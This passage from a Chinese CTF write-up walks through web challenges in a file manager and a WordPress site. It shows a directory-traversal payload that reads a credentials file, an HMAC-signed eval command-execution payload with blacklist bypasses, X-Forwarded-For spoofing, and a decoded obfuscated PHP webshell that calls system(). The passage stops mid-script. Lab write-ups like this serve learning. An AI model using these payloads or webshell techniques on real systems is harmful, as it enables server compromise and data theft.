+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">$admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因此定位<code>$GLOBALS[&quot;permissions&quot;]</code>，在<code>/core/fun_users.php</code>中发现其值取自<code>$data[6]</code></p>
+<p><img src="/report_cybersecurity01_img/156.png" alt=""></p>
+<p>而<code>$data</code>又是来源于<code>$user</code>与<code>$pass</code></p>
+<p><img src="/report_cybersecurity01_img/155.png" alt=""></p>
+<p>根据这两个参数寻找到函数<code>find_user()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">find_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $cnt = count($GLOBALS[<span class="string">"users"</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($user == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($pass == <span class="keyword">NULL</span> || ($pass == $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">1</span>] &amp;&amp; $GLOBALS[<span class="string">"users"</span>][$i][<span class="number">7</span>])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">"users"</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现其来源于<code>$GLOBALS[&quot;users&quot;]</code>，跟踪这个变量我们找到了<code>/.config/.htusers.php</code>，在其中发现了如下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$GLOBALS[<span class="string">"users"</span>] = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"guest"</span>, <span class="string">"084e0343a0486ff05530df6c705c8bb4"</span>, <span class="string">"./data/guest"</span>, <span class="string">"https://game1.security.ntu.st/data/guest"</span>, <span class="number">0</span>, <span class="string">"^.ht"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>这里只给出了 guest 的值，故接下来我们应该去想办法通过读文件得到 admin 的密码</p>
+<p>首先需要找到读文件的函数，在<code>/core/fun_down.php</code>发现了<code>readfile()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    $item = basename($item);</span><br><span class="line">    <span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $abs_item = get_abs_item($dir, $item);</span><br><span class="line">    <span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br><span class="line">    $browser = id_browser();</span><br><span class="line">    header(<span class="string">'Content-Type: '</span> . (($browser == <span class="string">'IE'</span> || $browser == <span class="string">'OPERA'</span>) ? <span class="string">'application/octetstream'</span> : <span class="string">'application/octet-stream'</span>));</span><br><span class="line">    header(<span class="string">'Expires: '</span> . gmdate(<span class="string">'D, d M Y H:i:s'</span>) . <span class="string">' GMT'</span>);</span><br><span class="line">    header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</span><br><span class="line">    header(<span class="string">'Content-Length: '</span> . filesize($abs_item));</span><br><span class="line">    <span class="keyword">if</span> ($browser == <span class="string">'IE'</span>) &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: public'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span> . $item . <span class="string">'"'</span>);</span><br><span class="line">        header(<span class="string">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class="line">        header(<span class="string">'Pragma: no-cache'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @readfile($abs_item);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中关键的一行是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class="string">'.php'</span>) || stristr($abs_item, <span class="string">'config'</span>)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这里进行了过滤，相当于告诉我们这里的读文件是个死胡同，因此寻找下一个点</p>
+<p>经过锲而不舍的寻找，我们在<code>/core/fun_edit.php</code>的函数<code>edit_file()</code>中发现端倪，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">01</span>) != <span class="number">01</span>) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_is_file($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"fileexist"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!get_show_item($dir, $item)) show_error($item . <span class="string">": "</span> . $GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfile"</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>由于我们<code>guest</code>的<code>$GLOBALS[&quot;permissions&quot;]</code>是<code>1</code>，故第一句代码满足</p>
+<p>第二句代码用于检测路径文件是否存在，先跳过</p>
+<p>第三句代码提到了<code>get_show_item()</code>函数，我们跟踪查看该函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_show_item</span><span class="params">($dir, $item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($item == <span class="string">"."</span> || $item == <span class="string">".."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">'help'</span>] == <span class="string">'me'</span>) &#123;</span><br><span class="line">        $_COOKIE[<span class="string">'help'</span>] = <span class="keyword">null</span>;</span><br><span class="line">        setcookie(<span class="string">'help'</span>, <span class="string">''</span>, time() - <span class="number">9999999999</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Very good. You know how to create cookie. How about tamper a cookie?")&lt;/script&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">'show_hidden'</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">'show_hidden'</span>, <span class="string">'no'</span>, time() + <span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (substr($item, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span> &amp;&amp; $GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span> &amp;&amp; $_COOKIE[<span class="string">'show_hidden'</span>] != <span class="string">'yes'</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"no_access"</span>] != <span class="string">""</span> &amp;&amp; @eregi($GLOBALS[<span class="string">"no_access"</span>], $item)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> ($GLOBALS[<span class="string">"show_hidden"</span>] == <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dirs = explode(<span class="string">"/"</span>, $dir);</span><br><span class="line">        <span class="keyword">foreach</span> ($dirs <span class="keyword">as</span> $i) <span class="keyword">if</span> (substr($i, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"."</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数对<code>$item</code>变量的过滤不够严谨，会引发目录穿越的漏洞</p>
+<p>因此我们在 edit 模式下，构造<code>item = /../../../../../etc/passwd</code>即可造成目录穿越读取任意文件</p>
+<p>paylaod:<code>?action=edit&amp;item=/../../../../../../var/www/webhdisk/.config/.htusers.php</code></p>
+<p>然后我们便拿到了 admin 用户的用户名和密码的 md5，解一下 md5</p>
+<p><img src="/report_cybersecurity01_img/157.png" alt=""></p>
+<p><img src="/report_cybersecurity01_img/158.png" alt=""></p>
+<p>得到用户名:<code>adm1n15trat0r</code>密码:<code>how do you turn this on</code></p>
+<p>登录后拿到 flag</p>
+<p><img src="/report_cybersecurity01_img/159.png" alt="image-20191223155939461"></p>
+<p>flag:<code>FLAG{how do you turn this on?}</code></p>
+<h3 id="dafuq-manager-3"><a href="#dafuq-manager-3" class="headerlink" title="dafuq-manager 3"></a>dafuq-manager 3</h3><h4 id="描述-18"><a href="#描述-18" class="headerlink" title="描述"></a>描述</h4><p>Get a shell to find flag 3</p>
+<h4 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h4><p>题目描述告诉我们本题需要获取到 shell</p>
+<p>审计源码，在<code>/core/fun_debug.php</code>中发现了存在命令执行的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_debug</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    assert(strlen($GLOBALS[<span class="string">'secret_key'</span>]) &gt; <span class="number">40</span>);</span><br><span class="line">    $dir = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'dir'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">list</span>($cmd, $hmac) = explode(<span class="string">'.'</span>, $GLOBALS[<span class="string">'__GET'</span>][<span class="string">'command'</span>], <span class="number">2</span>);</span><br><span class="line">    $cmd = base64_decode($cmd);</span><br><span class="line">    $bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">''</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br><span class="line">    <span class="keyword">foreach</span> ($bad_things <span class="keyword">as</span> $bad) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($cmd, $bad)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'2bad'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hash_equals(hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]), $hmac)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="keyword">eval</span>($cmd));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_error(<span class="string">'What does the fox say?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里首先需要绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp($dir, <span class="string">"magically"</span>) || strcmp($dir, <span class="string">"hacker"</span>) || strcmp($dir, <span class="string">"admin"</span>)) &#123;</span><br><span class="line">        show_error(<span class="string">'You are not hacky enough :('</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很显然我们可以使用数组<code>dir[]=</code>进行绕过</p>
+<p>然后我们找到 cmd 执行命令的生成函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, $GLOBALS[<span class="string">"secret_key"</span>]);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里 sha256 加密的 key 我们可以找到是</p>
+<p><code>KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3</code></p>
+<p>并且获取了对命令进行过滤的黑名单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$bad_things = <span class="keyword">array</span>(<span class="string">'system'</span>, <span class="string">'exec'</span>, <span class="string">'popen'</span>, <span class="string">'pcntl_exec'</span>, <span class="string">'proc_open'</span>, <span class="string">'passthru'</span>, <span class="string">''</span>, <span class="string">'eval'</span>, <span class="string">'assert'</span>, <span class="string">'preg_replace'</span>, <span class="string">'create_function'</span>, <span class="string">'include'</span>, <span class="string">'require'</span>, <span class="string">'curl'</span>,);</span><br></pre></td></tr></table></figure>
+
+<p>这里可以使用 base64 编码绕过</p>
+<p>最终编写 php 脚本如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_command</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    $hmac = hash_hmac(<span class="string">'sha256'</span>, $cmd, <span class="string">'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'</span>);</span><br><span class="line">    <span class="keyword">return</span> sprintf(<span class="string">'%s.%s'</span>, base64_encode($cmd), $hmac);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> make_command(<span class="string">'$a=\'ass\';$b=\'ert\';$c=$a.$b;$c(base64_decode(\'c3lzdGVtKCcuL2ZsYWczL21lb3cgLi9mbGFnMy9mbGFnMycp\'));'</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过脚本构造 payload:<code>?action=debug&amp;dir[]=&amp;command=JGE9InN5c3QiOyRiPSJlbSI7JGM9JGEuJGI7JGMoImxzIik7.516a67c2e080bd0d1c91a4a4ef68734f1ed0aa404991cbb2a4f1751c510f09b9</code></p>
+<p><img src="/report_cybersecurity01_img/160.png" alt=""></p>
+<p>寻找到目录下有 flag3 目录，在 flag3 中找到 flag，但无法直接 cat，执行该目录下的 c 程序即可得到 flag</p>
+<p>payload:<code>?action=debug&amp;dir[]=&amp;command=JGE9InN5c3QiOyRiPSJlbSI7JGM9JGEuJGI7JGMoIi4vZmxhZzMvbWVvdyAuL2ZsYWczL2ZsYWczIik7.dd5112e1ee879d74e3f5434e368ceeeae2893bd77a23de7ed8a742cf406a9094</code></p>
+<p><img src="/report_cybersecurity01_img/161.png" alt=""></p>
+<p>flag:<code>FLAG{Oh, Looks like you have a shell. Please don&#39;t fuck up the system.}</code></p>
+<h3 id="wordpress-1"><a href="#wordpress-1" class="headerlink" title="wordpress 1"></a>wordpress 1</h3><h4 id="描述-19"><a href="#描述-19" class="headerlink" title="描述"></a>描述</h4><p>Something strange is hidding in the source code, find it.<br>Tips: This challenge does not require to exploit any thing, don’t use any scanner.</p>
+<h4 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h4><p>打开网页，是一个博客网站，没有啥思路，之前没做过这样的题，因此随便翻一翻博客的博文，在一篇名为<code>Backup File</code>的博文中找到了网站源码的下载链接</p>
+<p><img src="/report_cybersecurity01_img/162.png" alt=""></p>
+<p>在源码中寻找了许久许久….终于在<code>wordpress/wp-content/plugins/core.php</code>中找到了一个与 flag 有关的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_f14g</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$h = <span class="string">'m'</span>.sprintf(<span class="string">'%s%d'</span>,<span class="string">'d'</span>,<span class="number">-4</span>+<span class="number">9e0</span>);</span><br><span class="line">	<span class="keyword">if</span>($h($_GET[<span class="string">'passw0rd'</span>]) === <span class="string">'5ada11fd9c69c78ea65c832dd7f9bbde'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(wp_get_user_ip() === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">			<span class="keyword">eval</span>(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_KEY), base64_decode(<span class="string">'zEFnGVANrtEUTMLVyBusu4pqpHjqhn3X+cCtepGKg89VgIi6KugA+hITeeKIpnQIQM8UZbUkRpuCe/d8Rf5HFQJSawpeHoUg5NtcGam0eeTw+1bnFPT3dcPNB8IekPBDyXTyV44s3yaYMUAXZWthWHEVDFfKSjfTpPmQkB8fp6Go/qytRtiP3LyYmofhOOOV8APh0Pv34VPjCtxcJUpqIw=='</span>), MCRYPT_MODE_CBC, $h($_GET[<span class="string">'passw0rd'</span>].AUTH_SALT)));</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Sorry, Only admin from localhost can get flag'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的判断条件是<code>passw0rd</code>要为<code>5ada11fd9c69c78ea65c832dd7f9bbde</code></p>
+<p>猜测 md5 过后的值，拿去解密得到明文<code>cat flag</code></p>
+<p><img src="/report_cybersecurity01_img/163.png" alt=""></p>
+<p>这里还有一个条件是<code>wp_get_user_ip() === &#39;127.0.0.1&#39;</code></p>
+<p>可以抓包修改<code>X-Forwarded-For: 127.0.0.1</code>进行绕过</p>
+<p>payload:<code>?passw0rd=cat%20flag</code></p>
+<p><img src="/report_cybersecurity01_img/164.png" alt=""></p>
+<p>得到 flag:<code>FLAG{Hello, You found my secret flag plugin! Try to found backdoor in my theme :D}</code></p>
+<h3 id="wordpress-2"><a href="#wordpress-2" class="headerlink" title="wordpress 2"></a>wordpress 2</h3><h4 id="描述-20"><a href="#描述-20" class="headerlink" title="描述"></a>描述</h4><p>Find another strange thing in the source code.<br>Tips: This challenge does not require to exploit any thing, don’t use any scanner.</p>
+<h4 id="思路-20"><a href="#思路-20" class="headerlink" title="思路"></a>思路</h4><p>这道题是真的难…居然要找出这个博客隐藏的一篇博文，说真的上一题找的我已经是眼花缭乱了</p>
+<p>只能去源码里找找有没有啥后门（例如前面做过的 debug 模式什么的）来进行突破</p>
+<p>参考了大佬的 wp，在<code>wordpress/wp-content/themes/astrid/template-parts/content-search.php</code>中找到了这么几句代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- de<span class="doctag">bug:</span>&lt;?php var_dump($wp_query-&gt;post-&gt;&#123;'post_'.(string)($_GET['debug']?:'type')&#125;); ?&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里把 post 提交的数据经过处理后输出到注释里面，然后我们尝试 get 提交 debug 为 title，因为这句疑似后门的代码在 search 中，所以应该是要搜索才能触发这个后门，同时本题最坑的一点就是需要在<code>/page/2</code>下调用搜索，真的是脑洞巨大</p>
+<p>构造<code>/page/2?s=&amp;debug=title</code></p>
+<p><img src="/report_cybersecurity01_img/165.png" alt=""></p>
+<p>在源码中果然回显了每个文章的标题</p>
+<p>那么继续构造<code>/page/2?s=&amp;debug=content</code></p>
+<p><img src="/report_cybersecurity01_img/166.png" alt=""></p>
+<p>果然在注释里出现了页面内容，最终寻找到 flag</p>
+<p><img src="/report_cybersecurity01_img/167.png" alt=""></p>
+<p>flag:<code>FLAG{Theme is good, but it may contains backd00r}</code></p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><h4 id="描述-21"><a href="#描述-21" class="headerlink" title="描述"></a>描述</h4><p>You have my webshell, find the flag!</p>
+<h4 id="思路-21"><a href="#思路-21" class="headerlink" title="思路"></a>思路</h4><p>打开网站，一篇空白，查看源码，也是一片空白…</p>
+<p><img src="/report_cybersecurity01_img/168.png" alt=""></p>
+<p>等等，不对劲，右边显示还有充分的下拉空间，尝试一下拉到底</p>
+<p><img src="/report_cybersecurity01_img/169.png" alt=""></p>
+<p>…天哪真的是脑洞</p>
+<p>对前一部分进行解码得</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span> (StrrEv(gZinflAtE(</span><br><span class="line">bASe64_DeCode(Str_rOt13(<span class="string">"KMSqn8VjTVKi9lgrcMtH3V</span></span><br><span class="line"><span class="string">qwT8jvb2vzjiltmKowKNt12dQTxxEDMC99voecmS</span></span><br><span class="line"><span class="string">H4rKBrpkXVDwmC1yBbi0PV1IeQA0GuTWSr3Pqi3I</span></span><br><span class="line"><span class="string">qTu92xznWEDw4FxeVNv4JpGewDovk8re57tTcMsM</span></span><br><span class="line"><span class="string">nk5nVDzzyefSIFS7PQb7AnFMfcg3UBjvl4H/GnPx</span></span><br><span class="line"><span class="string">/leZxlP/OFJYZ1cqYiHEDvWszvhYHoLnRhvv29gx</span></span><br><span class="line"><span class="string">cLgJbveVKw5k4jEwAc0VvFAtiPzpZ6BwDnQKOltX</span></span><br><span class="line"><span class="string">sF+JmSCVPdu0NI3qpr406XpZnKBpfAm+Rjhd9Z00</span></span><br><span class="line"><span class="string">TUQFagaWJg8qmNQowQCzaUmVaiSlCBLL+VkfuOYe</span></span><br><span class="line"><span class="string">A8+LkWdkHmDtp9xcmqB6H5OgyaqXK+gpWJTPBuHi</span></span><br><span class="line"><span class="string">STW8OO9t13k2/7r+He8BfU"</span>)))));</span><br></pre></td></tr></table></figure>
+
+<p>然后我们直接对<code>@eval</code>后面的函数进行<code>echo</code>输出即可看到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'sig'</span>])) &#123;</span><br><span class="line">        $cmd = hash(<span class="string">'SHA512'</span>, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) ^ (string) $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">        $key = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . sha1($_SERVER[<span class="string">'HTTP_HOST'</span>]);</span><br><span class="line">        $sig = hash_hmac(<span class="string">'SHA512'</span>, $cmd, $key);</span><br><span class="line">        <span class="keyword">if</span> ($sig === (string) $_GET[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">            header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">            <span class="keyword">return</span> !!system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">print</span> str_repeat(<span class="string">"\n"</span>, <span class="number">4096</span>);</span><br><span class="line">    readfile($_SERVER[<span class="string">'SCRIPT_FILENAME'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">run() ?: fuck();</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们需要构造能绕过<code>$sig === (string) $_GET[&#39;sig&#39;]</code>的 payload</p>
+<p>根据源码我在本地构造了 payload 生成脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span 